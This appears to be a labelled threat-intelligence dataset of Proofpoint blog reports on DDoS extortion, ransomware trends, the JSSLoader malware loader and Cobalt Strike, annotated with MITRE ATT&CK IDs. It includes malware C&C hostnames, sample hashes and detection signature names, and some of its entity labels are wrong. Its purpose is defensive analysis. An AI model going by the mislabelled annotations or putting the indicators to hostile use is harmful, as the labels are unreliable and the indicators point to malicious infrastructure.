of\u00a0two\u00a0BTC, which roughly\u00a0equated\u00a0to $76,000 USD on May 26, 2021.\nThe price doubles to\u00a0four\u00a0BTC after the deadline and increases by\u00a0one\u00a0BTC each day after that.\nThe Bitcoin addresses are unique to each potential target.\n### **Conclusion**\nWhile Proofpoint does not have visibility into the actual \u201cFancy Lazarus\u201d DDoS attacks and whether they are carried out, FBI\u00a0[reporting](https://www.documentcloud.org/documents/7070798-FLASH-MU-000132-DD.html)\u00a0indicates that many affected companies that pass the threatened deadline either do not see any additional activity or the activity is successfully mitigated.\nThere are, however, several prominent institutions that have either\u00a0[received](https://www.wsj.com/articles/hackers-targeted-financial-sector-in-mass-extortion-campaign-11612909155)\u00a0attack demonstrations or reported an impact to their operations, so it is important for companies and organizations to be prepared by having\u00a0appropriate mitigations in place such as using a DoS protection service and having disaster recovery plans at the ready.\n*EDIT (Added on 06/11/21)*\nA recent [report](https://blogs.akamai.com/2021/06/the-rapid-resurgence-of-ddos-extortion-that-didnt-take-long.html \"https://blogs.akamai.com/2021/06/the-rapid-resurgence-of-ddos-extortion-that-didnt-take-long.html\") by Akamai also notes a resurgence of this activity since May 2021 and provides a great amount of details and examples on the specific nature of the DDoS traffic.", "mitre_ids": ["T1499", "T1499", "T1499", "T1499", "G0007", "T1499", "T1499", "G0007", "T1499", "T1499"], "anno_name_label": [["GROUP", "Fancy Lazarus"], ["GROUP", "Fancy Lazarus"], ["GROUP", "Fancy Lazarus"], ["GROUP", "Fancy Bear"], ["GROUP", "Fancy Bear"], ["GROUP", "Fancy Lazarus"], ["GROUP", "Fancy Lazarus"], ["GROUP", "Fancy Lazarus"]], "cti_entity_class": ["CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE"]}, {"cti_report": "Announcing Proofpoint Information and Cloud Security Platform \u2013 Enabling DLP and SASE Use Cases\nJune 17, 2021\nAs the world continues to embrace work from anywhere and the adoption of cloud applications accelerates, people have become the new perimeter.\nTo protect that perimeter from threats, data loss and compliance risk, your organization needs visibility into risky behavior by remote workers, such as:\n* Downloading sensitive data from IT-approved applications\n* Storing enterprise data on personal cloud storage\n* Using unapproved cloud applications, such as chat and conference apps\n* Browsing malicious or inappropriate content\nAddressing these challenges requires in-line access controls and real-time data loss prevention (DLP) from the start.\nThat\u2019s why we\u2019ve rearchitected\u00a0[Proofpoint CASB Proxy](/us/resources/solution-briefs/casb-real-time-controls-approved-and-tolerated-apps \"CASB Real-Time Controls for Approved and Tolerated Apps\")\u00a0and introduced\u00a0[Proofpoint Web Security](/us/resources/data-sheets/proofpoint-web-security \"Proofpoint Web Security\")\u2014a cloud-native secure web gateway\u2014at\u00a0[Proofpoint Protect 2021](/us/newsroom/press-releases/proofpoint-launches-industrys-first-cloud-native-information-protection-and \"Proofpoint Launches Industry\u2019s First Cloud Native Information Protection  and Cloud Security Platform\").\nWe built these proxy-based cloud security solutions on the cloud-native but mature\u00a0[Proofpoint Zero Trust Network Access (ZTNA)](/us/products/cloud-security/secure-access \"Secure Access\")\u00a0infrastructure.\nThese solutions, combined with the\u00a0[Proofpoint Cloud App Security Broker (CASB)](/us/products/cloud-security/cloud-app-security-broker \"Cloud App Security Broker\"), [remote browser isolation](https://www.proofpoint.com/us/products/cloud-security/browser-isolation), and Proofpoint ZTNA solutions, provide organizations a new\u00a0[Secure Access Service Edge (SASE)](/us/threat-reference/sase \"SASE\")\u00a0security architecture that can ensure access control with threat and data protection for users accessing internet sites, cloud services and private applications.\n### **Proofpoint CASB Proxy for real-time controls for approved and tolerated cloud apps**\nYou need a forward proxy to govern access to cloud apps from corporate devices and prevent sensitive data loss in the cloud.\nAs files are uploaded and downloaded in the cloud, CASB Proxy monitors for sensitive data and enforces DLP policies.\nIt also identifies and classifies regulated data, such as personal health information (PHI), personally identifiable information (PII) and payment card industry (PCI) data, as well as intellectual property and confidential documents (for example, source code or design, legal and engineering documents).\nTogether with\u00a0[Proofpoint SaaS Isolation](/us/resources/solution-briefs/casb-adaptive-access-controls \"Proofpoint CASB Adaptive Access Controls\"), CASB Proxy provides granular access controls such as read-only access and real-time DLP for both approved and tolerated apps.\nSaaS Isolation secures users\u2019 access to cloud apps and data by isolating browser sessions in a secure container.\nUsing our proxy\u2019s contextual and people-centric policies, you can apply real-time data controls over cloud activity\u2014and help prevent data loss and compliance violations.\nWith the help of a lightweight endpoint agent, we forward user traffic to our cloud-native solution to block risky apps and provide access and data controls for approved and tolerated applications.\nCASB Proxy is an add-on to our CASB solution\u2014an integral part of the Proofpoint Information and Cloud Security Platform.\nWhen you start your cloud security journey, you can first deploy our CASB in API mode to gain in-depth visibility to cloud risks such as cloud account compromise, excessive file-sharing, and malicious or\u00a0[risky third-party OAuth (open authorization) apps](/us/blog/email-and-cloud-threats/how-attackers-use-compromised-accounts-create-and-distribute-malicious \"How Attackers Use Compromised Accounts to Create and Distribute Malicious OAuth Apps\").\nYou can also use our cloud applications catalog and traffic auditing capabilities to assess shadow IT risks.\nWith a better understanding of people, application and data risks, you can enhance your CASB solution with real-time controls, including adaptive access and data controls for unmanaged devices and forward proxy and isolation-based controls for managed devices.\nAnd when you need to expand access controls, threat protection and DLP beyond cloud applications to all internet traffic, you can upgrade to Proofpoint Web Security.\n### **Web security with the industry\u2019s best threat intelligence**\nAs organizations continue to reimagine security for their hybrid workforce, they also need to reimagine their security stack.\nThat includes the tools they need to secure internet traffic.\nThe old approach of having a web gateway-type of appliance in centralized data centers doesn\u2019t work in a world where users connect from everywhere and access company data located in various locations.\nA cloud-based security approach is critical to ensure users stay safe while browsing the web\u2014and that attackers don\u2019t comprise an organization\u2019s critical data and assets.\nProofpoint Web Security provides controls and isolation when end users are accessing the web.\nOur solution is built on a global, highly elastic cloud framework that allows ultimate scalability for organizations regardless of their size or location.\nWeb Security inspects all internet traffic, including encrypted traffic, to deliver access control to all users seamlessly.\nIt provides acceptable use control to specific sites and visibility and control of web app usage to help with the issue of shadow IT.\nTo ensure the highest level of security for users as they\u2019re browsing the internet, Proofpoint Web Security integrates with our industry-leading threat intelligence\u2014making it easier for an organization to block the most sophisticated, web-borne security threats.\n![Information Protection ](/sites/default/files/inline-images/Screen%20Shot%202021-06-18%20at%201.47.33%20PM.png)\n*Figure 1*\nProofpoint Web Security goes beyond traditional web gateway functionality or just blocking or allowing access to sites.\nIt has seamless integration with\u00a0[Proofpoint Browser Isolation](/us/resources/data-sheets/browser-isolation \"Browser Isolation\").\nThis integration allows organizations to send users to an isolated browser session when visiting certain categories of sites, such as unknown or personal sites (for example, email or medical).\nWhile in isolation, the user can access the site.\nBut if there are any threats on the site\u2019s pages, they\u2019re not allowed to leave isolation and impact the user.\nThis integration helps dramatically lower the organization\u2019s attack surface.\nIt also provides a better user experience and preserves the privacy of your people during personal browsing.\nWeb Security and Browser Isolation are part of the Proofpoint Information and Cloud Security Platform.\n### **A powerful platform with a unified console to \u201crule them all\u201d**\nThe\u00a0**Proofpoint Information and Cloud Security Platform**\u00a0brings together\u00a0[Proofpoint Enterprise DLP](/us/products/information-protection/enterprise-dlp \"Enterprise Data Loss Prevention \"),\u00a0[Proofpoint Insider Threat Management](/us/resources/data-sheets/insider-threat-management \"Proofpoint Insider Threat Management\"), CASB, ZTNA, Browser Isolation and Web Security.\nThis powerful, cloud-native single platform aligns to the industry vision of SASE architecture, where organizations can apply secure access and threat protection as people access applications and data, no matter their location or device type.\n![image 13](/sites/default/files/inline-images/image_13.png)\n*Figure 2*\nOur platform delivers a unique people-centric approach to access governance for the internet, cloud services and private applications, and DLP across email, cloud apps, the web and endpoints.\nIt combines:\n* A comprehensive suite of information protection and cloud security solutions\n* A unified administration and response console\n* Intelligent risk modeling\n* World-class threat, content and behavior detection\n* People-centric visibility and controls\n[Proofpoint Cloud Security](/us/products/cloud-security \"Security Service Edge\")\u00a0unifies people-centric access controls and threat protection for users of internet, cloud and private applications within a global cloud-native platform.\nTo enable adaptive and people-centric secure access across the enterprise, we combine:\u00a0\n* Granular controls such as risk-based authentication, read-only access and micro-segmented application access\n* Rich, cross-vector threat intelligence on user risk\n* Advanced threat protection\nWith coverage across all DLP channels and a common data classification framework,\u00a0[Proofpoint Information Protection](/us/products/information-protection \"Information Protection\")\u00a0combines content, behavior and threat-based telemetry with sophisticated analytics.\nSecurity teams worldwide rely on Proofpoint to address the full spectrum of data loss scenarios across malicious, negligent and compromised users.\nIts unified alerts also help users better prioritize warnings, respond faster and achieve a shorter time to value.\nOur unified admin and response console simplifies day-to-day security operations and accelerates response by combining advanced tools:\n**![Dashbaord](/sites/default/files/inline-images/Screen%20Shot%202021-06-16%20at%2012.20.32%20PM.png)**\n*Figure 3*\n#### **Policy management:**\n* Manage all cloud and data access policies in a single console\n* Create sophisticated rules across multiple channels using a common data classification framework and advanced threat intelligence and detection\n#### **Incident and investigative workflow:**\n* Collect threat, DLP and user-behavior alerts into a unified alert manager to get a holistic risk profile for the user\n* Investigate user behavior to determine intent and severity of risk\n* Manage alert status cross-functionally from discovery to resolution\n#### **Threat hunting and explorations:**\n* Proactive hunting for new threats such as cloud account compromise, large data transfer to personal cloud storage, unsanctioned application use, and more\n* Build watch lists that organize and prioritize users by risk profile (executives, Very Attacked People\u2122 (VAPs), privileged users, human resources staff, contractors, and others)\n* Powerful filter and search functionality to customize out-of-the-box explorations\n#### **Reporting and analytics:**\n* Intuitive timeline-based views of user and data activity across multiple channels\n* Based on user intent, share reports of risky activities with business partners\n* Correlate multichannel activities and alerts with data from other security tools through seamless integration with security information and event management (SIEM), security, orchestration, automation and response (SOAR), and ticketing systems\n#### **Administration and data privacy controls:**\n* Manage alerts and investigations cross-functionally with role-based access controls\n* Address data privacy concerns with granular, attribute-based access controls\nOur platform is global, with the ability to store data locally to help you meet data compliance requirements.\n### **Discover more**\nLearn more about the information and cloud security solutions from Proofpoint:\n* [Proofpoint Information Protection](/us/products/information-protection \"Information Protection\")\n* [Proofpoint CASB](/us/products/cloud-security/cloud-app-security-broker \"Cloud App Security Broker\")\n* [Proofpoint CASB Proxy](/us/resources/solution-briefs/casb-real-time-controls-approved-and-tolerated-apps \"CASB Real-Time Controls for Approved and Tolerated Apps\")\n* [Proofpoint Web Security](/us/resources/data-sheets/proofpoint-web-security \"Proofpoint Web Security\")", "mitre_ids": ["T1566"], "anno_name_label": [], "cti_entity_class": ["CE"]}, {"cti_report": "Ransomware Insights from Proofpoint\u2019s Senior Director of  Threat Research and Detection, Sherrod DeGrippo\nJune 22, 2021\nWhile email has historically been the undisputed champion of [ransomware](https://www.proofpoint.com/us/threat-reference/ransomware) attack vectors, its role has undergone a major transformation.\nIn\u00a0a recent article\u00a0by Kelly Sheridan\u00a0in\u00a0[Dark Reading](https://beta.darkreading.com/attacks-breaches/ransomware-operators-strategies-evolve-as-attacks-rise),\nSherrod\u00a0DeGrippo\u00a0explains the changing landscape as she\u2019s seen it from her perch as Proofpoint\u2019s\u00a0Senior\u00a0Director, Threat Research and Detection.\nRansomware\u00a0was once\u00a0sent to users directly, usually in an email attachment.\nThese direct or \u201c[first stage](https://www.proofpoint.com/us/blog/threat-insight/first-step-initial-access-leads-ransomware)\u201d attacks peaked in 2017 during the\u00a0[Locky\u00a0ransomware](/us/threat-insight/post/dridex-actors-get-in-ransomware-with-locky \"Locky Ransomware Is Becoming More Sophisticated - Cybercriminals Continue Email Campaign Innovation\")\u00a0outbreak.\nAt their height, one million such attacks were detected every day.\nYet attack damage\u00a0\u2013\u00a0and therefore ransoms\u00a0\u2013\u00a0were\u00a0fairly limited, often ending in one infected machine that could be fixed by restoring from a previous backup.\nAs\u00a0DeGrippo\u00a0tells Dark Reading: \u201cMany IT and information security teams in corporate settings were able to quickly adapt to the handling of a ransomware incident on a single laptop or host, treating it in some ways as stolen hardware and simply reformatting and moving on.\nThat began changing in 2018 as\u00a0[ransomware attackers](/us/security-awareness/post/ransomware-roundup-march-2018 \"Ransomware Roundup: March 2018\")\u00a0increasingly\u00a0leveraged\u00a0cybercriminal organizations \u2013 mostly banking trojan distributors \u2013 to install \u201caccess facilitators.\nStill hitching a ride via email, these \u201csecond stage\u201d attacks were a bit more subtle and a lot more damaging.\nInstead of directly launching a ransomware attack, malicious links and attachments within the email quietly download backdoor trojans unbeknownst to users.\nAccording to\u00a0DeGrippo, what happens next depends on the attacker.\nSome attackers maintain the access and sell it, some\u00a0cover their tracks to\u00a0remove traces of their presence.\nOther attackers practice double and even triple extortion,\u00a0selling stolen data on Dark Web markets or publishing it unless\u00a0a\u00a0ransom is paid.\n\u201cThreat actors moved to downloaders as a first stage to give themselves more choice and flexibility,\u201d she continues.\n\u201cIt is a natural evolution.\nWhile direct ransomware attacks are not extinct, they\u2019re getting there.\nIn fact, only one strain accounted\u00a0for 95 percent direct, first-stage ransomware attacks in\u00a0the first half of\u00a02021.\n### That Was Then,\u00a0This\u00a0is Now These days, banking trojans\u00a0\u2013 often used as ransomware loaders \u2013are the runaway favorite among malware distributors.\nAccording to\u00a0DeGrippo, banking trojans accounted for almost 20 percent of malware her researchers observed in identified campaigns.\nBanking trojans are also the most popular type of malware in the overall threat landscape observed by Proofpoint.\nCompounding the problem, criminal groups already distributing banking trojans can join ransomware \u201caffiliate networks\u201d to further their reach.\nProofpoint currently tracks 10 threat actors\u00a0acting as\u202finitial access\u202ffacilitators\u202for likely ransomware affiliates.\nPrior to its takedown in 2020, the\u00a0[Emotet\u00a0botnet](/us/threat-insight/post/proofpoint-q1-2019-threat-report-emotet-carries-quarter-consistent-high-volume \"Proofpoint Q1 2019 Threat Report: Emotet carries the quarter with consistent high-volume campaigns\")\u00a0was one of the most prolific ransomware distributors between 2018 and 2020.\nSince\u00a0Emotet\u2019s\u00a0disruption,\u00a0DeGrippo\u2019s\u00a0team has tracked a myriad of other malware such as\u202fThe Trick,\u202fDridex,\u202fQbot,\u202fIcedID,\u202fZLoader,\u202fUrsnif, serving as first-stage malware payloads in attempts to enable further infections.\nProofpoint researchers have also tracked downloaders like\u00a0Buer\u00a0Loader and\u00a0[BazaLoader](/us/blog/threat-insight/bazaflix-bazaloader-fakes-movie-streaming-service \"BazaFlix: BazaLoader Fakes Movie Streaming Service \")\u00a0which often serve as an initial attack vector for ransomware.\nOver the last six months, Proofpoint has seen almost 300 downloader campaigns distributing nearly\u00a0six\u00a0million malicious messages.\nThe article notes that ransomware is not the only second stage payload associated with the above malware and downloaders, and that ransomware purveyors do use other attack methods to distribute their product.\nDeGrippo\u00a0states that other targets include software flaws,\u00a0VPN\u2019s, Remote Access Protocols, and other external-facing appliances.\nIn other words, ransomware isn\u2019t limited to existing backdoors.\n\"Regardless of the broker economy, the initial vectors are now much more open and available,\" she explains.\n\"Threat actors have specialized and brought great efficacy to their campaigns with that specialization.\nDark Reading concludes with some findings by Check Point Research which point to a dramatic surge in ransomware, including a 93 percent growth year-over-year.\nIn 2021 alone, ransomware has experienced a 41 percent growth, felt most in Latin America (62 percent) and Europe (59 percent).\nFor more on Proofpoint\u2019s Advanced Threat Protection, visit:\u00a0\n<https://www.proofpoint.com/us/products/advanced-threat-protection>\u00a0\nFor more on Proofpoint\u2019s Targeted Attack Protection, visit:\u00a0\n<https://www.proofpoint.com/us/products/advanced-threat-protection/targeted-attack-protection>\u00a0\nTo learn more about Proofpoint\u2019s ransomware research, visit:\u00a0\n<https://www.proofpoint.com/us/blog/threat-insight/first-step-initial-access-leads-ransomware>\u00a0", "mitre_ids": ["T1486", "T1486", "T1566", "T1486", "T1486", "T1486", "T1486", "T1566", "T1105", "T1070", "T1105", "T1486", "T1486", "T1486", "T1486", "TA0001", "T1486", "S0367", "S0367", "T1486", "S0367", "S0266", "S0384", "S0483", "S0386", "T1105", "S0534", "S0534", "T1486", "T1486", "T1486", "T1486", "T1486", "T1486", "T1486"], "anno_name_label": [["MALWARE", "QBot"], ["MALWARE", "Zloader"], ["TECHNIQUE", "Buer"]], "cti_entity_class": ["CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE"]}, {"cti_report": "JSSLoader: Recoded and Reloaded\u202f\nJune 24, 2021\n### Key Takeaways\n* After a months-long absence, the malware loader\u00a0JSSLoader\u00a0returned in June 2021 campaigns rewritten from the .NET programming language to C++.\n* Rewriting the [malware](https://www.proofpoint.com/us/threat-reference/malware)\u00a0could be an effort by threat actors to evade current detections.\n* Current\u00a0TA543\u00a0campaigns\u00a0delivering\u00a0JSSLoader\u00a0are\u00a0using similar lures\u00a0to those observed by Proofpoint researchers in 2019\u00a0and\u00a0the emails\u00a0continue to\u00a0contain links to a TDS landing page.\n### Overview\nIn June 2021,\u00a0Proofpoint researchers observed a new variant of the downloader\u00a0JSSLoader\u00a0in several campaigns impacting a variety of organizations.\nThis version of the malware loader\u00a0was\u00a0rewritten from .NET to the C++ programming language.\nThis change, while not unheard of, is not a common occurrence and could be an effort by the threat actors utilizing\u00a0JSSLoader\u00a0to evade current detections.\nJSSLoader\u00a0is often dropped in the first or second stage of a campaign and has the functionality to profile infected machines and load additional payloads.\nThe campaigns are ongoing and\u00a0use\u00a0similar\u00a0lures\u00a0to those initially observed by Proofpoint researchers in 2019.\nAccording to our data, the recent campaigns have\u00a0attempted to target\u00a0as many as\u00a0several\u00a0hundred organizations at a time across a wide range of\u00a0industries, including finance, manufacturing, technology, retail, healthcare, education, and transportation.\n### Malware Analysis\nProofpoint researchers initially observed\u00a0[JSSLoader](https://malpedia.caad.fkie.fraunhofer.de/details/win.jssloader)\u00a0in September 2019.\nIt was written in .NET at the time and being actively developed.\nFast forward nearly two years and Proofpoint has now identified this latest variant of the malware loader written in C++.\nIt has much of the same functionality as previous iterations.\nThe following provides a\u00a0more in-depth\u00a0look at that early version and the changes the loader has undergone since 2019.\n#### 2019\u00a0Version of\u00a0JSSLoader\u00a0(.NET)\nJSSLoader\u00a0is an initial access malware\u00a0that\u00a0was written in .NET and was named after its \u201cJSS\u201d namespace and \u201cjssAdmin\u201d command and control (C&C) panel login page:\u00a0\n![Graphical user interface, application, website\nDescription automatically generated](data:image;base64_removed,)\u00a0\n*Figure\u00a01. JSSLoader\u00a0C&C panel login page from September\u00a027,\u00a02019\u00a0version.*\nIts C&C used HTTPS requests with base64-encoded data:\u00a0\n![A picture containing text Description automatically generated](data:image;base64_removed,)\u00a0\n*Figure\u00a02. Example C&C request from September 27,\u00a02019\u00a0version.*\nThe initial C&C beacon contained verbose system information:\u00a0\n![Table Description automatically generated](data:image;base64_removed,)\u00a0\n*Figure\u00a03. Example system information (trimmed for readability) from September 27,\u00a02019\u00a0version.*\nIts commands and functionality focused on executing a next stage\u00a0executable\u00a0or JavaScript:\u00a0\n![Text Description automatically generated](data:image;base64_removed,)\u00a0\n*Figure\u00a04. Commands from September 27,\u00a02019\u00a0version.*\n#### 2020-2021\u00a0JSSLoader\u00a0Changes\u00a0(.NET)\nSince the initial version of\u00a0JSSLoader, there have been gradual changes and improvements to the malware in successive campaigns.\nMorphisec\u00a0wrote about some of these in a January 2021 paper titled \u201c[Threat Profile the Evolution of the FIN7\u00a0JSSLoader\u00a0(PDF)](https://www.morphisec.com/hubfs/eBooks_and_Whitepapers/FIN7%20JSSLOADER%20FINAL%20WEB.pdf).\nTwo of the most visible changes were a switch from the verbose system information to a JSON object and the addition of new commands.\nFor\u00a0example, the\u00a0JSSLoader\u00a0used in a December 14,\u00a02020\u00a0email-based campaign sent the following system information:\u00a0\n![Text, letter Description automatically generated](data:image;base64_removed,)\u00a0\n*Figure\u00a05. Example system information (formatted and trimmed for readability) from December 14,\u00a02020\u00a0version.*\nWhile the formatting changed, the beacon contained\u00a0much of the same information\u00a0as the\u00a0original version.\nIn addition to the changes in the C&C protocol, several new commands were added.\nThe focus of the new commands was still on executing a next stage:\u00a0\n![Text Description automatically generated](data:image;base64_removed,)\u00a0\n*Figure\u00a06. Commands from December 14,\u00a02020\u00a0version.*\nAfter this December 2020 campaign, activity paused and the malware went through a redevelopment phase, according to Proofpoint\u2019s visibility.\n#### June 2021\u00a0JSSLoader\u00a0(C++)\nIn June 2021, email campaigns resumed, but the\u00a0JSSLoader\u00a0malware had been redeveloped from using the .NET programming language to C++ (this change was also\u00a0[noticed on infosec Twitter](https://twitter.com/Arkbird_SOLG/status/1400845449515372555)).\nIt is not common for a malware to be redeveloped in a different programming language, but it does happen occasionally.\nProofpoint recently\u00a0[documented](https://www.proofpoint.com/us/blog/threat-insight/new-variant-buer-loader-written-rust)\u00a0another\u00a0initial access\u00a0malware known as \u201cBuer\u00a0Loader\u201d that was redeveloped from the C programming language to Rust.\nAs noted in that blog post, rewriting a malware can enable threat actors to better evade existing detection capabilities.\nThe C++ version of\u00a0JSSLoader\u00a0analyzed\u00a0here is\u00a0from a June 8,\u00a02021\u00a0email-based campaign.\nIt sets up \u201cregistry run\u201d persistence using a value name of \u201cAppJSSLoader\u201d and has similar style of system information beacon as the later .NET versions:\u00a0\n![Text, letter Description automatically generated](data:image;base64_removed,)\u00a0\n*Figure\u00a07. Example system information (formatted and trimmed for readability) from June 8,\u00a02021\u00a0C++ version.*\nThe C++ version also has similar command functionality, though they switched from the \u201cCmd\u201d prefix of the later .NET versions back to the \u201cTask\u201d prefix seen in the earlier .NET samples:\u00a0\n![Graphical user interface Description automatically generated with medium confidence](data:image;base64_removed,)\u00a0\n*Figure\u00a08. Commands from June 8,\u00a02021\u00a0C++ version.*\nC&C protocol and command similarity\u00a0was\u00a0likely a choice to remain backwards compatible with the existing .NET\u00a0version\u2019s\u00a0C&C panel software.\n### Campaign\u00a0Details\nJSSLoader\u00a0appears to be exclusive to several\u00a0threat actors.\nIn fact, Proofpoint has only\u00a0observed\u00a0two actors using it since\u00a0the first email campaign in 2019.\nMost of the campaigns\u00a0were\u00a0attributed to\u00a0the threat actor tracked by Proofpoint as\u00a0TA543.\nThey\u00a0are characterized by their\u00a0widespread\u00a0distribution with opportunistic targeting.\nA typical campaign contains thousands of email messages and targets several hundred organizations.\nThe lures used by TA543\u00a0typically focus on\u00a0invoices and delivery information of packages.\nThe following\u00a0sections describe\u00a0and compare the\u00a0original\u00a0campaigns observed by Proofpoint in 2019\u00a0to\u00a0the\u00a0June 2021\u00a0campaigns.\n#### September 2019 Campaign Example\nOn\u00a0September\u00a027,\u00a02019\u00a0Proofpoint analysts observed a TA543 campaign spoofing Intuit\u00a0branding.\nThe threat actor used a likely compromised account for an email marketing service to send the malicious emails that purported to be invoices and\u00a0contained URLs linking to a landing page hosting\u00a0BlackTDS.\u00a0The TDS would direct the user to the download another file, a VBS downloader, hosted on SharePoint.\nThe VBS downloader would then download\u00a0JSSLoader.\nDuring our analysis of\u00a0JSSLoader, it additionally loaded a Griffon payload which is historically associated with another actor, TA3546, also known as FIN7 or\u00a0Carbanak.\nIn the following months\u00a0Proofpoint analysts\u00a0observed TA543 shift to primarily delivering\u00a0JSSLoader\u00a0and/or other loaders that were often observed downloading other TA3546-associated payloads.\n![Graphical user interface, application, Teams Description automatically generated](data:image;base64_removed,)\u00a0\n*Figure\u00a09. TA543 email that leads\u00a0to the download of\u00a0JSSLoader.*\n#### June 2021 Campaign Example\nOn June 8, 2021,\u00a0Proofpoint analysts\u00a0observed a TA543 campaign spoofing\u00a0UPS\u00a0branding (Figure\u00a010).\nThe email contained\u00a0URLs\u00a0linking\u00a0to a\u00a0Keitaro\u00a0TDS landing.\nIn turn,\u00a0the landing linked\u00a0to the download of a Windows Scripting File (WSF) hosted on\u00a0SharePoint.\nIf executed, it downloaded\u00a0an intermediate script,\u00a0which then downloaded\u00a0and executed\u00a0the C++ version of\u00a0JSSLoader.\n![Graphical user interface, application Description automatically generated](data:image;base64_removed,)\u00a0\n*Figure\u00a010. TA543 email sample\u00a0from\u00a0June 8, 2021, that leads to the\u00a0download\u00a0of\u00a0JSSLoader.*\n### Conclusion\nThe threat actors behind\u00a0JSSLoader\u00a0have continuously made modifications since its debut in 2019 and are likely to continue doing so using the 2021 variant.\nWith the redevelopment of the malware into C++, which was possibly\u00a0done\u00a0to evade current detections and make analysis more difficult, Proofpoint researchers have not seen the .NET version in play.\nInstead, researchers anticipate seeing small refinements being made to the 2021 version in future campaigns, keeping in line with the evolution of the .NET version over the past two years.\n**Indicators of Compromise**\n| **Indicator** | **Type** | **Notes** |\n| dd86898c784342fc11c42bea4c815cb536455ee709e7522fb64622d9171c465d\u00a0 | SHA256\u00a0 | September 27,\u00a02019\u00a0JSSLoader\u00a0Sample\u00a0 |\n| bikweb\\.com\u00a0 | Hostname\u00a0 | September 27,\u00a02019\u00a0JSSLoader\u00a0C&C\u00a0 |\n| a062a71a6268af048e474c80133f84494d06a34573c491725599fe62b25be044\u00a0 | SHA256\u00a0 | December 14,\u00a02020\u00a0JSSLoader\u00a0sample\u00a0 |\n| monusorge\\.com\u00a0 | Hostname\u00a0 | December 14,\u00a02020\u00a0JSSLoader\u00a0C&C\u00a0 |\n| 7a17ef218eebfdd4d3e70add616adcd5b78105becd6616c88b79b261d1a78fdf\u00a0 | SHA256\u00a0 | June 8,\u00a02021\u00a0JSSLoader\u00a0Sample\u00a0 |\n| injuryless\\.com\u00a0 | Hostname\u00a0 | June 8,\u00a02021\u00a0JSSLoader\u00a0C&C\u00a0 |\n**ET Signatures**\n2033072 - ET TROJAN FIN7\u202fJSSLoader\u202fVariant Activity (POST)\u202f\u00a0\n2033074 - ET TROJAN FIN7\u202fJSSLoader\u202fVariant Activity (GET)\u202f\u00a0\n2838606 - ETPRO TROJAN Win32/jssLoader\u202fCnC\u202fActivity\u202f\u00a0\n2838607 - ETPRO TROJAN Win32/jssLoader\u202fCnC\u202fCheckin\u202f\u00a0\n2842028 - ETPRO TROJAN\u202fJSSLoader\u202fCnC\u202fHost\u202fCheckin\u202f\u00a0", "mitre_ids": ["S0648", "S0648", "S0648", "T1566", "S0648", "S0648", "S0648", "T1105", "S0648", "S0648", "S0648", "TA0001", "TA0011", "TA0011", "S0648", "TA0011", "T1071", "TA0011", "T1041", "T1105", "T1059", "S0648", "S0648", "G0046", "S0648", "S0648", "TA0011", "S0648", "T1566", "S0648", "TA0001", "S0648", "T1566", "T1547", "TA0011", "TA0011", "S0648", "T1566", "T1566", "T1059", "T1059", "S0648", "S0648", "S0417", "G0046", "G0046", "G0046", "S0648", "G0046", "S0648", "T1566", "S0648", "S0648", "S0648", "S0648", "S0648", "TA0011", "S0648", "S0648", "TA0011", "S0648", "S0648", "TA0011", "G0046", "S0648", "G0046", "S0648", "S0648"], "anno_name_label": [["GROUP", "TA453"], ["TECHNIQUE", "Buer"], ["GROUP", "TA453"], ["GROUP", "TA453"], ["GROUP", "TA453"], ["GROUP", "TA453"], ["GROUP", "TA453"], ["GROUP", "TA453"], ["GROUP", "TA453"]], "cti_entity_class": ["CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE"]}, {"cti_report": "Cobalt Strike: Favorite Tool from APT to Crimeware\nJune 29, 2021\n```\n*(Updated 8/18/2021 at the request of a third-party)*\n```\n### Key Findings\n* Malicious use of Cobalt Strike\u00a0in threat actor campaigns\u00a0is increasing.\n* Threat actor use of Cobalt Strike increased 161 percent\u00a0from 2019 to\u00a02020\u00a0and remains\u00a0a\u00a0high-volume\u00a0threat\u00a0in 2021.\n* Cobalt Strike is\u00a0currently\u00a0used by more cybercrime and general commodity [malware](https://www.proofpoint.com/us/threat-reference/malware) operators than APT and espionage threat actors.\n### Overview\nIn 2021, Cobalt Strike\u00a0is\u00a0appearing\u00a0in\u00a0Proofpoint\u00a0threat\u00a0data more frequently than ever.\nCobalt Strike is a legitimate security tool used by penetration testers to emulate\u00a0threat actor\u00a0activity in a network.\nHowever, it is\u00a0also\u00a0increasingly used by malicious actors \u2013 Proofpoint saw a 161 percent increase in threat actor use of the tool\u00a0from\u00a02019\u00a0to\u00a02020.\nThis aligns with\u00a0[observations](https://www.recordedfuture.com/2020-adversary-infrastructure-report/)\u00a0 from other security firms as more threat actors adopt hacking tools in their operations.\nWhen\u00a0mapped to\u00a0the\u00a0[MITRE ATT&CK framework](https://attack.mitre.org/matrices/enterprise/), Proofpoint\u2019s\u00a0visibility\u00a0into the attack chain\u00a0focuses on\u00a0[Initial Access](https://www.proofpoint.com/us/blog/threat-insight/first-step-initial-access-leads-ransomware), Execution, and Persistence\u00a0mechanisms.\nThat is: How are threat actors attempting to compromise hosts and what payloads are they deploying first.\nOur\u00a0corpus of\u00a0threat actor\u00a0data includes\u00a0criminal\u00a0and state-associated\u00a0threat actor\u00a0groups.\nBased on our data,\u00a0Proofpoint assesses\u00a0with high confidence\u00a0that\u00a0Cobalt Strike is becoming increasingly popular among threat actors as an initial access payload, not just a second-stage\u00a0tool threat actors\u00a0use\u00a0once access is achieved, with\u00a0criminal\u00a0threat\u00a0actors making up the bulk of\u00a0attributed\u00a0Cobalt Strike\u00a0campaigns\u00a0in 2020.\n### Background\nIn December 2020, the world learned about an expansive and effective espionage campaign that successfully backdoored the popular network monitoring software SolarWinds.\nInvestigators\u00a0[revealed 